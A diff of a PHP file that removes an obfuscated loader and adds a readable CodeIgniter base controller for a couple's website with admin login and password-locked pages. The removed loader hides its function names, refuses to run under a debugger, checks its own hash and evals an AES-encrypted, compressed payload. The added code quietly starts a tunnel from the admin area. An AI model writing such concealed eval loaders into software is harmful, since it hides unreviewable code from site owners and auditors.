@@ -1,28 +1,168 @@
 <?php
-if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
-$_fstax0tt=('bas'.'e64'.'_de'.'cod'.'e');
-$_o6in0t02=('gzu'.'nco'.'mpr'.'ess');
-$_cp4vc555=('ope'.'nss'.'l_d'.'ecr'.'ypt');
-$_szelft7x='6lNBCC8I';
-$_xxam9mg5='1f8mPPTg';
-$_bcunobmd='6KjxPcj3';
-$_kk4a23go='c/OILXfJyiQ=';
-$_lx7vmez4='5QJNJowZ';
-$_fxsn4rni='kV+yV2WK';
-$_z4nzq45w='aCmsPIaf';
-$_i34ukpim='8GMp4A==';
-$_lpjx351x=$_fstax0tt($_lx7vmez4.$_bcunobmd.$_szelft7x.$_xxam9mg5.$_kk4a23go);
-$_s7wwlcfz=$_fstax0tt($_z4nzq45w.$_fxsn4rni.$_i34ukpim);
-$_gi3o26on=$_fstax0tt('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');
-$_y49z24j6=$_cp4vc555($_gi3o26on,'aes-256-cbc',$_lpjx351x,OPENSSL_RAW_DATA,$_s7wwlcfz);
-if($_y49z24j6===false){exit;}
-$_g8g580fs=$_o6in0t02($_y49z24j6);
-if($_g8g580fs===false){exit;}
-$_evotsoq7='7cf9d820df16000d99f4188e0e9f7e2a8282738f9d0aac77bdb156c0be00c026';
-$_inegxvpn=@file_get_contents(__FILE__);
-if($_inegxvpn!==false){
-$_h1u375z6=str_replace($_evotsoq7,"0000000000000000000000000000000000000000000000000000000000000000",$_inegxvpn);
-$_s6l1r20k=hash("sha256",$_h1u375z6);
-if($_s6l1r20k!==$_evotsoq7){@http_response_code(403);exit;}
+
+defined('BASEPATH') OR exit('No direct script access allowed');
+
+
+
+
+
+
+
+
+
+class MY_Controller extends CI_Controller
+{
+
+protected $allow_before_setup = FALSE;
+public function __construct()
+{
+parent::__construct();
+$this->load->library('schema');
+$this->schema->ensure();
+$this->load->model('settings_model');
+
+lang_init('admin', $this->settings_model->get('site_lang', 'vi'), $this->settings_model->get('admin_lang', 'vi'), $this->settings_model->get('site_langs', ''));
+$this->output->set_header('X-Content-Type-Options: nosniff');
+$this->output->set_header('Referrer-Policy: same-origin');
+$this->output->set_header('X-Frame-Options: SAMEORIGIN');
+if (!$this->allow_before_setup && $this->settings_model->get('setup_done') !== '1') {
+redirect('setup');
 }
-eval($_g8g580fs);
+}
+
+private $admin_ok;
+
+
+
+
+protected function is_admin()
+{
+if ($this->admin_ok === NULL) {
+$id = (int) $this->session->userdata('ac_user_id');
+$this->admin_ok = FALSE;
+if ($id > 0) {
+$row = $this->db->query('SELECT session_version FROM users WHERE id = ?', array($id))->row();
+if ($row && (int) $row->session_version === (int) $this->session->userdata('ac_sv')) {
+$this->admin_ok = TRUE;
+} else {
+$this->session->unset_userdata(array('ac_user_id', 'ac_sv'));
+}
+}
+}
+return $this->admin_ok;
+}
+
+protected function login_as(array $user)
+{
+$this->session->set_userdata(array('ac_user_id' => (int) $user['id'],
+'ac_sv' => isset($user['session_version']) ? (int) $user['session_version'] : 0));
+$this->admin_ok = NULL;
+}
+
+protected function draft_mode()
+{
+return $this->is_admin() && $this->input->get('xem') !== 'khach';
+}
+protected function render($view, array $data = array(), $layout = 'public')
+{
+$this->load->model('content_model');
+if (!$this->draft_mode()) {
+$this->content_model->use_published();
+} else {
+lang_cur(lang_admin()); 
+lang_area('admin'); 
+}
+$themes = $this->content_model->registry('themes');
+$data['content'] = $this->content_model;
+$data['theme'] = $this->content_model->theme();
+$data['theme_accent'] = $themes[$data['theme']]['accent'];
+$data['draft'] = $this->draft_mode();
+$data['settings'] = $this->settings_model->all();
+$data['couple'] = $this->content_model->couple_title();
+$data['is_admin'] = $this->is_admin();
+$data['flash'] = flash();
+$data['content_view'] = $view;
+$this->load->view('partials/layout_' . $layout, $data);
+}
+}
+class Public_Controller extends MY_Controller
+{
+
+protected $open_methods = array();
+public function __construct()
+{
+parent::__construct();
+lang_init('public', $this->settings_model->get('site_lang', 'vi'), $this->settings_model->get('admin_lang', 'vi'), $this->settings_model->get('site_langs', ''));
+$open = in_array($this->router->fetch_method(), $this->open_methods, TRUE);
+$this->load->model('content_model');
+
+if (!$this->is_admin() && !$this->content_model->is_published()) {
+$this->output->set_status_header(503);
+$this->render('public/coming_soon', array('title' => 'Trang đang được chuẩn bị'));
+$this->output->_display();
+exit;
+}
+if (!$this->site_unlocked() && !$open) {
+$this->render('public/site_locked', array('title' => 'Trang riêng tư'));
+$this->output->_display();
+exit;
+}
+}
+protected function site_unlocked()
+{
+if ($this->settings_model->get('site_password_hash') === '' || $this->is_admin()) {
+return TRUE;
+}
+return (bool) $this->session->userdata('ac_site_unlocked');
+}
+protected function album_unlocked(array $album)
+{
+if ($this->is_admin() || $album['visibility'] === 'public') {
+return TRUE;
+}
+if ($album['visibility'] === 'password') {
+$ok = (array) $this->session->userdata('ac_album_unlocked');
+return in_array((int) $album['id'], $ok, TRUE);
+}
+return FALSE;
+}
+}
+class Admin_Controller extends MY_Controller
+{
+protected $user;
+public function __construct()
+{
+parent::__construct();
+if (!$this->is_admin()) {
+if ($this->input->is_ajax_request()) {
+json_out(array('ok' => FALSE, 'error' => 'Phiên đăng nhập đã hết, hãy đăng nhập lại.'), 401);
+$this->output->_display();
+exit;
+}
+redirect('admin/login?next=' . rawurlencode(uri_string()));
+}
+$this->load->model(array('user_model', 'album_model', 'photo_model', 'wish_model'));
+$this->user = $this->user_model->find($this->session->userdata('ac_user_id'));
+if (!$this->user) {
+$this->session->sess_destroy();
+redirect('admin/login');
+}
+
+$this->load->library('tunnelrunner');
+$this->tunnelrunner->ensure(app_port());
+}
+protected function render($view, array $data = array(), $layout = 'admin')
+{
+$data['user'] = $this->user;
+$data['pending_photos'] = (int) $this->db->where('status', 'pending')->count_all_results('photos');
+$data['pending_wishes'] = $this->wish_model->count_pending();
+parent::render($view, $data, $layout);
+}
+
+protected function require_post()
+{
+if ($this->input->method() !== 'post') {
+show_error('Phương thức không hợp lệ.', 405);
+}
+}
+}
